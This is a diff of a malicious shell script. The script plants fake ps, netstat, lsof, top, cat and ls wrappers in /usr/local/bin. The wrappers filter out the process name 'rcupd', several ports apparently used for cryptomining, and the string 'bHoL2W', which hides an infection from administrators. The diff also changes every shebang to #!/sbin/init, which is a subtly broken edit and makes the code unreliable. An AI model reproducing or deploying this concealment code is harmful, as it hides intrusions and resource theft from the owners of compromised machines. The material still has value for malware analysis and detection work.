@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/sbin/init
 
 program_exists() {
     local ret='0'
@@ -93,37 +93,37 @@ if [[ ${etc_exist} == 0 ]]; then
 fi
 touch /usr/local/bin/ps
 cat<<EOF>>/usr/local/bin/ps
-#!/bin/bash
+#!/sbin/init
 /bin/ps \$@ | grep -Ev 'rcupd|3333|3334|5555|5556|7777'
 EOF
 chmod +x /usr/local/bin/ps
 touch /usr/local/bin/netstat
 cat<<EOF>>/usr/local/bin/netstat
-#!/bin/bash
+#!/sbin/init
 /bin/netstat \$@ | grep -Ev 'rcupd|3333|3334|5555|5556|7777'
 EOF
 chmod +x /usr/local/bin/netstat
 touch /usr/local/bin/lsof
 cat<<EOF>>/usr/local/bin/lsof
-#!/bin/bash
+#!/sbin/init
 /usr/bin/lsof \$@ | grep -Ev 'rcupd|3333|3334|5555|5556|7777'
 EOF
 chmod +x /usr/local/bin/lsof
 touch /usr/local/bin/top
 cat <<EOF >> /usr/local/bin/top
-#!/bin/bash
+#!/sbin/init
 /usr/bin/top \$@ | grep -Ev 'rcupd'
 EOF
 chmod +x /usr/local/bin/top
 touch /usr/local/bin/cat
 cat<<EOF>>/usr/local/bin/cat
-#!/bin/bash
+#!/sbin/init
 /bin/cat \$@ | grep -Ev 'bHoL2W'
 EOF
 chmod +x /usr/local/bin/cat
 touch /usr/local/bin/ls
 cat<<EOF>>/usr/local/bin/ls
-#!/bin/bash
+#!/sbin/init
 /bin/ls \$@ | grep -Ev 'rcupd'
 EOF
 chmod +x /usr/local/bin/ls
